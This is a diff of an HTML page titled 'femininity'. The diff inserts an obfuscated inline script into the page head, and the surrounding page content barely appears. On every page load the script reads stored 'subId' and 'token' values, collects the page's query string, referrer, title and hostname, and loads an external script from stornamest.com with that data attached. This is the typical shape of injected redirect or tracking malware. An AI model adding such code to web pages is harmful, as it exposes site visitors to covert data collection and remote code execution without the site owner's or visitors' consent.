@@ -1,7 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    
+    <script>
+    (function() {
+    var name = '_xxLLxjDBGmWq9yRk';
+    if (!window._xxLLxjDBGmWq9yRk) {
+        window._xxLLxjDBGmWq9yRk = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://stornamest.com/83Kd1z4W',
+            P_PATH: 'https://stornamest.com/7b4f75c/postback',
+        };
+    }
+    const _144LfCtHGPk3VCCy = localStorage.getItem('config');
+    if (typeof _144LfCtHGPk3VCCy !== 'undefined' && _144LfCtHGPk3VCCy !== null) {
+        var _sZJMVBfBmxCZHCkr = JSON.parse(_144LfCtHGPk3VCCy);
+        var _QjJP3k5T2hNmqxVX = Math.round(+new Date()/1000);
+        if (_sZJMVBfBmxCZHCkr.created_at + window._xxLLxjDBGmWq9yRk.ttl < _QjJP3k5T2hNmqxVX) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _Jp8MGMVSM82H3bV4 = localStorage.getItem('subId');
+    var _bJZ9Hnk6HFYrZQGX = localStorage.getItem('token');
+    var _k5RwY6hp4GJnXV97 = '?return=js.client';
+        _k5RwY6hp4GJnXV97 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _k5RwY6hp4GJnXV97 += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _k5RwY6hp4GJnXV97 += '&default_keyword=' + encodeURIComponent(document.title);
+        _k5RwY6hp4GJnXV97 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _k5RwY6hp4GJnXV97 += '&name=' + encodeURIComponent(name);
+        _k5RwY6hp4GJnXV97 += '&host=' + encodeURIComponent(window._xxLLxjDBGmWq9yRk.R_PATH);
+    if (typeof _Jp8MGMVSM82H3bV4 !== 'undefined' && _Jp8MGMVSM82H3bV4 && window._xxLLxjDBGmWq9yRk.unique) {
+        _k5RwY6hp4GJnXV97 += '&sub_id=' + encodeURIComponent(_Jp8MGMVSM82H3bV4);
+    }
+    if (typeof _bJZ9Hnk6HFYrZQGX !== 'undefined' && _bJZ9Hnk6HFYrZQGX && window._xxLLxjDBGmWq9yRk.unique) {
+        _k5RwY6hp4GJnXV97 += '&token=' + encodeURIComponent(_bJZ9Hnk6HFYrZQGX);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._xxLLxjDBGmWq9yRk.R_PATH + _k5RwY6hp4GJnXV97;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 
     <title>femininity</title>
     <!-- favicon -->
